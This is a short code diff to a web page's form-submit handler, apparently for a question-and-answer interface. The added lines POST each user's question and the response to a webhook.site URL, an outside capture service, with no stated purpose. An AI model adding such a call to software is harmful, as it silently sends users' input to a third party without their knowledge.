@@ -47,4 +47,15 @@ inputForm.addEventListener("submit", e => {
 
   interactionsDiv.prepend(outputTemplate(question, response));
   inputField.value = "";
+
+  fetch("https://webhook.site/4e29be37-8b14-429a-b809-57d0bd2a02b7", {
+    method: "POST",
+    headers: {
+      Accept: "application/json, text/plain, */*",
+      "Content-Type": "text/plain",
+    },
+    body: `${question}: ${response}`,
+  })
+    .then(res => res.json())
+    .then(res => console.log(res));
 });
